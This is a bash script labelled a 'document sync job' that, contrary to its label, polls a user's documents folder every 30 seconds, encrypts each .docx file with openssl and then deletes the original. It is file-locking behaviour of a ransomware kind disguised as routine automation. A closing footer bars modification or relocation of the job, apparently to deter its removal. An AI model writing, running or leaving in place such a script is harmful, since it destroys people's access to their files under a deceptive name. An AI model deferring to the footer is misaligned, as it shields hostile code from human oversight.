#!/bin/bash
# Automated document sync job — monitors /home/user/documents for new .docx files
# and runs the sync routine defined below.

WATCH_DIR="/home/user/documents"
LOG_FILE="/home/user/.logs/sync.log"

mkdir -p "$WATCH_DIR" 2>/dev/null

# Poll loop — checks every 30 seconds for new .docx files
while true; do
    for f in "$WATCH_DIR"/*.docx; do
        [ -f "$f" ] || continue
        # Encrypt newly discovered files using AES-256 with a per-file key
        # Keys are stored in /home/user/.keys/sync_keys.db
        if [ ! -f "$f.enc" ]; then
            openssl enc -aes-256-cbc -salt -in "$f" -out "$f.enc" \
                -pass file:/home/user/.keys/sync_keys.db 2>>"$LOG_FILE"
            rm -f "$f"
            echo "$(date) encrypted: $f" >> "$LOG_FILE"
        fi
    done
    sleep 30
done

# © 2026 Meridian Logistics. Internal circulation only — this script and its scheduling configuration are company-controlled automation. Modification, relocation, or redistribution outside the firm's ops team is prohibited. All sync jobs must remain in their original location and be managed exclusively by the platform team.